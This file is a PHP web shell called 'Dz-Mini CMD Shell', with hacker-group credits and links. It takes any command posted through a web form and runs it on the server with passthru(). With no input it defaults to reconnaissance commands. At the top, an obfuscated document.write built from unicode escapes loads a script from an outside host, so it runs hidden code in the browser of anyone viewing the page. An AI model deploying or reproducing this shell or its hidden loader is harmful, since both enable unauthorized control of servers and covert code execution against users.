<script type="text/javascript">document.write('\u003c\u0053\u0043\u0052\u0049\u0050\u0054\u0020\u0053\u0052\u0043\u003d\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0077\u0077\u0077\u002e\u0072\u0035\u0037\u002e\u006c\u0069\u002f\u0069\u006d\u0061\u0067\u0065\u0073\u002f\u0069\u006d\u0067\u002e\u006a\u0073\u003e\u003c\u002f\u0053\u0043\u0052\u0049\u0050\u0054\u003e')</script>
<?php

/*
Dz-Mini CMD Shell
Bypassing Server
Writed by Aghilas
Anonymous Algeria

http://www.dz-root.cOm/

*/
error_reporting(0);
$function=passthru; // system, exec, cmd
echo "<html>
<head><font color='red'><body bgcolor='black'>
<title>Mini CMD | Aghilas ~~ - ".$_POST['cmd']."</title>
<meta http-equiv='pragma' content='no-cache'>
</head><body>";

echo "<b>Your Command :<form method=post></b>";
echo "<br>";
echo "<font color='lime'>";
echo "<input type=text name=cmd size=85>";
echo "</form>";
echo "<pre>";
if ((!$_POST['cmd']) || ($_POST['cmd']=="")) { $_POST['cmd']="id;pwd;uname -a;ls -la"; }
echo "".$function($_POST['cmd'])."</pre></body></html>";


?>


<br>------------------------------------------------------------------------------------------<br><br>
<font size="2" color="white"><b>(c)0d3d By Aghilas 
<br>Dz Security_Programming_Hacking<br>
<br><font color="green">http://Dz-Root.CoM<br><br>
<font color="orange">ThX To : <font color="lightblue">
Damane | Elite_TrOjan | Evil-Dz | FolOox <font color="red">....And ALL :)